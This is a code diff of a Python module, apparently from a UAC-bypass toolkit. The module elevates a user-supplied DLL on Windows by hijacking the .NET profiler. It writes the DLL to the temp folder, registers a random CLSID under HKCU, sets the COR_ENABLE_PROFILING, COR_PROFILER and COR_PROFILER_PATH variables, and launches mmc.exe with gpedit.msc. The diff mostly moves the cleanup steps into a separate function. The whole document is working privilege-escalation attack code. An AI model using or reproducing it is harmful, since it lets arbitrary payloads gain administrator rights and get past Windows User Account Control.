@@ -20,7 +20,6 @@ dotnet_info = {
 guid_array = []
 
 def GenerateGUID():
-	""" This function generates a random UUID """
 	try:
 		guid_array.append(uuid.uuid4())
 	except Exception:
@@ -28,18 +27,58 @@ def GenerateGUID():
 	else:
 		return True
 
+def dotnet_uacbypass_cleanup():
+	print_info("Performing cleaning")
+	if os.path.isfile(os.path.join(tempfile.gettempdir(), "payload.dll")) == True:
+		try:
+			os.remove(os.path.join(tempfile.gettempdir(), "payload.dll"))
+		except Exception:
+			print_warning("Unable to delete payload from ({path})".format(path=os.path.join(tempfile.gettempdir(), "payload.dll")))
+		else:
+			print_success("Successfully deleted payload from ({path})".format(path=os.path.join(tempfile.gettempdir(), "payload.dll")))
+
+	if "64" in information().architecture():
+		path = "Software\\Classes\\WOW6432Node\\CLSID\\{{{guid}}}".format(guid=guid_array[0])
+
+		if registry().remove_key(hkey="hkcu", path=path, name=None, delete_key=True):
+			print_success("Successfully deleted CLSID ({path})".format(path=path))
+		else:
+			print_warning("Unable to delete CLSID ({path})".format(path=path))
+	else:
+		path = "Software\\Classes\\CLSID\\{{{guid}}}".format(guid=guid_array[0])
+
+		if registry().remove_key(hkey="hkcu", path=path, name=None, delete_key=True):
+			print_success("Successfully deleted CLSID ({path})".format(path=path))
+		else:
+			print_warning("Unable to delete CLSID ({path})".format(path=path))
+
+	if registry().remove_key(hkey="hkcu", path="Environment", name="COR_ENABLE_PROFILING", delete_key=False):
+		print_success("Successfully deleted environment variable (COR_ENABLE_PROFILING)")
+	else:
+		print_warning("Unable to delete environment variable (COR_ENABLE_PROFILING)")
+
+	if registry().remove_key(hkey="hkcu", path="Environment", name="COR_PROFILER", delete_key=False):
+		print_success("Successfully deleted environment variable (COR_PROFILER)")
+	else:
+		print_warning("Unable to delete environment variable (COR_PROFILER)")
+
+	if registry().remove_key(hkey="hkcu", path="Environment", name="COR_PROFILER_PATH", delete_key=False):
+		print_success("Successfully deleted environment variable (COR_PROFILER_PATH)")
+	else:
+		print_warning("Unable to delete environment variable (COR_PROFILER_PATH)")
+
 def dotnet_uacbypass(payload):
 	if payloads().dll(payload):
 		try:
 			payload_data = open(os.path.join(payload), "rb").read()
-		except Exception as error:
+		except Exception:
 			return False
 
 		try:
 			dll_file = open(os.path.join(tempfile.gettempdir(), "payload.dll"), "wb")
 			dll_file.write(payload_data)
 			dll_file.close()
-		except Exception as error:
+		except Exception:
 			return False
 
 		if GenerateGUID():
@@ -48,18 +87,18 @@ def dotnet_uacbypass(payload):
 				print_info("Writing CLSID: {path}".format(path=path))
 				
 				if registry().modify_key(hkey="hkcu", path=path, name=None, value=None, create=True):
-					print_success("Created: {path}".format(path=path))
+					print_success("Successfully created CLSID ({path})".format(path=path))
 				else:
-					print_error("Unable to create: {path}".format(path=path))
+					print_error("Unable to create CLSID ({path})".format(path=path))
 					return False
 			else:
 				path = "Software\\Classes\\CLSID\\{{{guid}}}".format(guid=guid_array[0])
 				print_info("Writing CLSID: {path}".format(path=path))
 				
 				if registry().modify_key(hkey="hkcu", path=path, name=None, value=None, create=True):
-					print_success("Created: {path}".format(path=path))
+					print_success("Successfully created CLSID ({path})".format(path=path))
 				else:
-					print_error("Unable to create: {path}".format(path=path))
+					print_error("Unable to create CLSID ({path})".format(path=path))
 					return False
 		else:
 			print_error("Unable to generate a random GUID")
@@ -67,74 +106,37 @@ def dotnet_uacbypass(payload):
 
 		print_info("Creating Environment variables")
 		if registry().modify_key(hkey="hkcu", path="Environment", name="COR_ENABLE_PROFILING", value="1", create=True):
-			print_success("Created: COR_ENABLE_PROFILING")
+			print_success("Successfully created environment variable (COR_ENABLE_PROFILING)")
 		else:
-			print_error("Unable to create: COR_ENABLE_PROFILING")
-			return False
-		
+			print_error("Unable to create environment variable (COR_ENABLE_PROFILING)")
+			if "error" in Constant.output:
+				dotnet_uacbypass_cleanup()
+
 		if registry().modify_key(hkey="hkcu", path="Environment", name="COR_PROFILER", value="{{{guid}}}".format(guid=guid_array[0]), create=True):
-			print_success("Created: COR_PROFILER")
+			print_success("Successfully created environment variable (COR_PROFILER)")
 		else:
-			print_error("Unable to create: COR_PROFILER")
-			return False
+			print_error("Unable to create environment variable (COR_PROFILER)")
+			if "error" in Constant.output:
+				dotnet_uacbypass_cleanup()
 			
 		if registry().modify_key(hkey="hkcu", path="Environment", name="COR_PROFILER_PATH", value=os.path.join(tempfile.gettempdir(), "payload.dll"), create=True):
-			print_success("Created: COR_PROFILER_PATH")
+			print_success("Successfully created environment variable (COR_PROFILER_PATH)")
 		else:
-			print_error("Unable to create: COR_PROFILER_PATH")
-			return False
+			print_error("Unable to create environment variable (COR_PROFILER_PATH)")
+			if "error" in Constant.output:
+				dotnet_uacbypass_cleanup()
 
 		if process().create("mmc.exe", params="gpedit.msc", window=True):
-			print_success("Created mmc.exe process")
+			print_success("Successfully created mmc.exe process")
 		else:
 			print_error("Unable to create mmc.exe process")
-			return False
-			
+			if "error" in Constant.output:
+				dotnet_uacbypass_cleanup()
+
 		time.sleep(5)
 
-		print_info("Performing clean up")
-		if os.path.isfile(os.path.join(tempfile.gettempdir(), "payload.dll")) == True:
-			try:
-				os.remove(os.path.join(tempfile.gettempdir(), "payload.dll"))
-			except Exception as error:
-				print_warning("Unable to delete payload from directory, manual cleaning needed!")
-			else:
-				print_success("Successfully deleted payload from directory")
-
-		if "64" in information().architecture():
-			path = "Software\\Classes\\WOW6432Node\\CLSID\\{{{guid}}}".format(guid=guid_array[0])
-
-			if registry().remove_key(hkey="hkcu", path=path, name=None, delete_key=True):
-				print_success("Deleted CLSID: {path}".format(path=path))
-			else:
-				print_error("Unable to delete CLSID: {path}".format(path=path))
-				return False
-		else:
-			path = "Software\\Classes\\CLSID\\{{{guid}}}".format(guid=guid_array[0])
-
-			if registry().remove_key(hkey="hkcu", path=path, name=None, delete_key=True):
-				print_success("Deleted CLSID: {path}".format(path=path))
-			else:
-				print_error("Unable to delete CLSID: {path}".format(path=path))
-				return False
-
-		if registry().remove_key(hkey="hkcu", path="Environment", name="COR_ENABLE_PROFILING", delete_key=False):
-			print_success("Deleted Environment: COR_ENABLE_PROFILING")
-		else:
-			print_error("Unable to delete: COR_ENABLE_PROFILING")
-			return False
-
-		if registry().remove_key(hkey="hkcu", path="Environment", name="COR_PROFILER", delete_key=False):
-			print_success("Deleted Environment: COR_PROFILER")
-		else:
-			print_error("Unable to delete: COR_PROFILER")
-			return False
-
-		if registry().remove_key(hkey="hkcu", path="Environment", name="COR_PROFILER_PATH", delete_key=False):
-			print_success("Deleted Environment: COR_PROFILER_PATH")
-		else:
-			print_error("Unable to delete: COR_PROFILER_PATH")
-			return False
+		if not dotnet_uacbypass_cleanup():
+			print_success("All done!")
 	else:
 		print_error("Cannot proceed, invalid payload")
 		return False
